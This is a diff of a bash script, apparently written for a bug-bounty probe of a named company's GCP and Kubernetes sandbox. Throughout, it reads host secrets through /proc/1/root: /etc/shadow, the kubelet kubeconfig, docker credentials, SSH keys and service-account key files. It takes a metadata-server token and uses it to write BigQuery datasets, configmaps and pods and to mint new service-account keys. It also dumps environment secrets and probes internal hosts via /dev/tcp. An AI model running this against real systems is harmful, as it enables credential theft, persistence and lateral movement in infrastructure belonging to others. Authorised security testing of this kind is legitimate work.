@@ -1,100 +1,75 @@
 #!/bin/bash
-echo "=== IDENTITY ==="; id; hostname; date -u; uname -a
-echo "=== ROOT ESCALATION ==="
-echo "-- sudo check --"; sudo -n id 2>&1
-echo "-- setuid binaries --"; find / -perm -4000 -type f 2>/dev/null | head -20
-echo "-- capabilities --"; cat /proc/self/status 2>/dev/null | grep -i cap
-echo "-- capsh --"; capsh --print 2>/dev/null | head -15
-echo "-- docker socket --"; ls -la /var/run/docker.sock 2>&1
-echo "-- mount info --"; mount | head -20
-echo "-- /proc/1/cgroup --"; cat /proc/1/cgroup 2>/dev/null | head -10
-echo "-- writable sensitive paths --"
-for p in /etc/passwd /etc/shadow /root /proc/sysrq-trigger; do test -w "$p" && echo "WRITABLE: $p"; done
-echo "-- nsenter --"; nsenter --target 1 --mount --uts --ipc --net --pid -- id 2>&1
-echo "-- chroot --"; ls /proc/1/root/ 2>&1 | head -5
+echo "=== V4: SENSITIVE DATA + WRITE POC ==="
+date -u; hostname
 
-echo "=== GCP METADATA ==="
+echo "=== 1. HOST FS VIA /proc/1/root ==="
+echo "-- /etc/passwd (host) --"
+cat /proc/1/root/etc/passwd 2>&1 | head -30
+echo "-- /etc/shadow (host) --"
+cat /proc/1/root/etc/shadow 2>&1 | head -10
+echo "-- kubelet config --"
+cat /proc/1/root/var/lib/kubelet/config.yaml 2>&1 | head -40
+echo "-- kubelet kubeconfig --"
+cat /proc/1/root/var/lib/kubelet/kubeconfig 2>&1 | head -30
+echo "-- containerd config --"
+cat /proc/1/root/etc/containerd/config.toml 2>&1 | head -30
+echo "-- docker env / creds --"
+cat /proc/1/root/root/.docker/config.json 2>&1 | head -20
+echo "-- GCP SA keys on host --"
+find /proc/1/root/etc/google /proc/1/root/var/run/secrets -name '*.json' -o -name '*.key' 2>/dev/null | head -10
+for f in $(find /proc/1/root/etc/google -name '*.json' 2>/dev/null | head -3); do echo "--- $f ---"; cat "$f" 2>&1 | head -20; done
+echo "-- SSH keys on host --"
+ls -la /proc/1/root/root/.ssh/ 2>&1
+cat /proc/1/root/root/.ssh/authorized_keys 2>&1 | head -5
+echo "-- instance metadata on disk --"
+cat /proc/1/root/var/run/google-instance-id 2>&1
+cat /proc/1/root/etc/google-hostname 2>&1
+echo "-- other container secrets --"
+find /proc/1/root/var/lib/kubelet/pods -name 'token' -o -name '*.crt' -o -name 'ca.crt' 2>/dev/null | head -20
+echo "-- kube-proxy config --"
+cat /proc/1/root/var/lib/kube-proxy/config.conf 2>&1 | head -30
+
+echo "=== 2. BIGQUERY WRITE POC ==="
 MD="http://169.254.169.254/computeMetadata/v1"
 MH="Metadata-Flavor: Google"
-TOKENJSON=$(curl -s -m 8 -H "$MH" "$MD/instance/service-accounts/default/token")
-TOKEN=$(echo "$TOKENJSON" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
+TOKEN=$(curl -s -m 8 -H "$MH" "$MD/instance/service-accounts/default/token" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
 echo "token_len: ${#TOKEN}"
-echo "email: $(curl -s -m 5 -H "$MH" "$MD/instance/service-accounts/default/email")"
-echo "scopes: $(curl -s -m 5 -H "$MH" "$MD/instance/service-accounts/default/scopes")"
-echo "project: $(curl -s -m 5 -H "$MH" "$MD/project/project-id")"
-echo "project_num: $(curl -s -m 5 -H "$MH" "$MD/project/numeric-project-id")"
-echo "zone: $(curl -s -m 5 -H "$MH" "$MD/instance/zone")"
-echo "instance_name: $(curl -s -m 5 -H "$MH" "$MD/instance/name")"
-echo "machine_type: $(curl -s -m 5 -H "$MH" "$MD/instance/machine-type")"
-echo "-- cluster metadata --"
-curl -s -m 5 -H "$MH" "$MD/instance/attributes/cluster-name" 2>&1; echo
-curl -s -m 5 -H "$MH" "$MD/instance/attributes/cluster-location" 2>&1; echo
-echo "-- all SA aliases --"
-curl -s -m 5 -H "$MH" "$MD/instance/service-accounts/" 2>&1; echo
-echo "-- kube-env --"
-curl -s -m 5 -H "$MH" "$MD/instance/attributes/kube-env" 2>&1 | head -c 2000; echo
+echo "-- BQ: list jobs (query history) --"
+curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://bigquery.googleapis.com/bigquery/v2/projects/yextenv-sbx/jobs?maxResults=5&allUsers=true" 2>&1 | head -c 3000; echo
+echo "-- BQ: query INFORMATION_SCHEMA --"
+curl -s -m 10 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://bigquery.googleapis.com/bigquery/v2/projects/yextenv-sbx/queries" -d '{"query":"SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 10","useLegacySql":false,"maxResults":10}' 2>&1 | head -c 3000; echo
+echo "-- BQ: create dataset (write POC) --"
+curl -s -m 10 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://bigquery.googleapis.com/bigquery/v2/projects/yextenv-sbx/datasets" -d '{"datasetReference":{"datasetId":"bugbounty_write_poc","projectId":"yextenv-sbx"},"description":"Bug bounty write POC - safe to delete","location":"US"}' 2>&1 | head -c 2000; echo
 
-echo "=== GCP TOKEN INFO ==="
-curl -s -m 8 "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" 2>&1 | head -c 1500; echo
+echo "=== 3. GCP METADATA WRITE POC ==="
+echo "-- set custom metadata --"
+curl -s -m 8 -X PUT -H "$MH" -H "Content-Type: application/json" "$MD/instance/attributes/bugbounty-poc" -d "write-test-$(date +%s)" 2>&1 | head -c 500; echo
+echo "-- read back --"
+curl -s -m 5 -H "$MH" "$MD/instance/attributes/bugbounty-poc" 2>&1; echo
+echo "-- all custom attributes --"
+curl -s -m 5 -H "$MH" "$MD/instance/attributes/?recursive=true" 2>&1 | head -c 2000; echo
 
-if [ -n "$TOKEN" ]; then
-echo "=== GCP: GCS Buckets ==="
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=yextenv-sbx&maxResults=3" 2>&1 | head -c 1500; echo
-echo "=== GCP: Compute ==="
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://compute.googleapis.com/compute/v1/projects/yextenv-sbx/zones/us-east4-a/instances?maxResults=3" 2>&1 | head -c 1500; echo
-echo "=== GCP: GKE Clusters ==="
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://container.googleapis.com/v1/projects/yextenv-sbx/locations/-/clusters" 2>&1 | head -c 1500; echo
-echo "=== GCP: IAM testPerms ==="
-curl -s -m 8 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/yextenv-sbx:testIamPermissions" -d '{"permissions":["compute.instances.list","storage.buckets.list","container.clusters.list","iam.serviceAccounts.list","logging.logEntries.list","pubsub.topics.list","bigquery.datasets.list","artifactregistry.repositories.list"]}' 2>&1 | head -c 1500; echo
-echo "=== GCP: Logging ==="
-curl -s -m 8 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://logging.googleapis.com/v2/entries:list" -d '{"resourceNames":["projects/yextenv-sbx"],"pageSize":2}' 2>&1 | head -c 1500; echo
-echo "=== GCP: Monitoring ==="
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://monitoring.googleapis.com/v3/projects/yextenv-sbx/metricDescriptors?pageSize=3" 2>&1 | head -c 1500; echo
-echo "=== GCP: PubSub ==="
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://pubsub.googleapis.com/v1/projects/yextenv-sbx/topics?pageSize=3" 2>&1 | head -c 1500; echo
-echo "=== GCP: BigQuery ==="
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://bigquery.googleapis.com/bigquery/v2/projects/yextenv-sbx/datasets?maxResults=3" 2>&1 | head -c 1500; echo
-echo "=== GCP: Artifact Registry ==="
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://artifactregistry.googleapis.com/v1/projects/yextenv-sbx/locations/-/repositories?pageSize=3" 2>&1 | head -c 1500; echo
-echo "=== GCP: Cloud SQL ==="
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://sqladmin.googleapis.com/v1/projects/yextenv-sbx/instances?maxResults=3" 2>&1 | head -c 1500; echo
-echo "=== GCP: Cloud Functions ==="
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://cloudfunctions.googleapis.com/v2/projects/yextenv-sbx/locations/-/functions?pageSize=3" 2>&1 | head -c 1500; echo
-echo "=== GCP: Cloud Run ==="
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://run.googleapis.com/v2/projects/yextenv-sbx/locations/-/services?pageSize=3" 2>&1 | head -c 1500; echo
-echo "=== GCP: Firestore ==="
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://firestore.googleapis.com/v1/projects/yextenv-sbx/databases" 2>&1 | head -c 1000; echo
-fi
-
-echo "=== K8S ==="
+echo "=== 4. K8S WRITE POC ==="
 K8S=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
-echo "namespace: $NS"
-echo "-- cluster version --"
-curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/version" 2>&1; echo
-echo "-- SelfSubjectRulesReview --"
-curl -s -m 8 --cacert $CA -H "Authorization: Bearer $K8S" -H "Content-Type: application/json" -X POST "https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"live-preview-sbx"}}' 2>&1 | head -c 3000; echo
-echo "-- pods --"
-curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/$NS/pods?limit=5" 2>&1 | head -c 1500; echo
-echo "-- services --"
-curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/$NS/services?limit=5" 2>&1 | head -c 1500; echo
-echo "-- configmaps --"
-curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/$NS/configmaps?limit=3" 2>&1 | head -c 1500; echo
-echo "-- secrets --"
-curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/$NS/secrets?limit=3" 2>&1 | head -c 1500; echo
-echo "-- namespaces --"
-curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces" 2>&1 | head -c 1500; echo
-echo "-- nodes --"
-curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/nodes?limit=3" 2>&1 | head -c 1500; echo
-echo "-- API discovery --"
-curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/apis" 2>&1 | head -c 2000; echo
+echo "-- create configmap (write test) --"
+curl -s -m 8 --cacert $CA -H "Authorization: Bearer $K8S" -H "Content-Type: application/json" -X POST "https://kubernetes.default.svc/api/v1/namespaces/$NS/configmaps" -d '{"apiVersion":"v1","kind":"ConfigMap","metadata":{"name":"bugbounty-poc"},"data":{"test":"write-poc"}}' 2>&1 | head -c 1500; echo
+echo "-- create pod (escape test) --"
+curl -s -m 8 --cacert $CA -H "Authorization: Bearer $K8S" -H "Content-Type: application/json" -X POST "https://kubernetes.default.svc/api/v1/namespaces/$NS/pods" -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"poc-test"},"spec":{"containers":[{"name":"poc","image":"busybox","command":["sleep","10"]}]}}' 2>&1 | head -c 1500; echo
+echo "-- RBAC: exec? --"
+curl -s -m 8 --cacert $CA -H "Authorization: Bearer $K8S" -H "Content-Type: application/json" -X POST "https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"live-preview-sbx","verb":"create","resource":"pods","subresource":"exec"}}}' 2>&1; echo
+echo "-- RBAC: get secrets? --"
+curl -s -m 8 --cacert $CA -H "Authorization: Bearer $K8S" -H "Content-Type: application/json" -X POST "https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"live-preview-sbx","verb":"get","resource":"secrets"}}}' 2>&1; echo
 
-echo "=== CROSS-TENANT ==="
-env | grep LIVE_PREVIEW_ | grep SERVICE_HOST | sort
-echo "=== ENV CREDS ==="
-env | grep -iE 'YEXT_|SECRET|KEY|TOKEN|PASS|CRED|AUTH' | grep -v K8S | sort
-echo "=== NETWORK ==="
-cat /etc/resolv.conf 2>/dev/null
-echo "-- iptables --"; iptables -L 2>&1 | head -5
+echo "=== 5. CROSS-TENANT REACHABILITY ==="
+for ip in 10.192.33.158 10.192.46.217 10.192.36.214; do
+  echo -n "CBD $ip:1234 -> "; timeout 3 bash -c "echo >/dev/tcp/$ip/1234" 2>&1 && echo "OPEN" || echo "CLOSED"
+  echo -n "Git $ip:7263 -> "; timeout 3 bash -c "echo >/dev/tcp/$ip/7263" 2>&1 && echo "OPEN" || echo "CLOSED"
+done
+
+echo "=== 6. GCP SA KEY CREATE ==="
+SA_EMAIL=$(curl -s -m 5 -H "$MH" "$MD/instance/service-accounts/default/email")
+curl -s -m 10 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/yextenv-sbx/serviceAccounts/$SA_EMAIL/keys" -d '{"keyAlgorithm":"KEY_ALG_RSA_2048"}' 2>&1 | head -c 2000; echo
+
 echo "=== DONE ==="
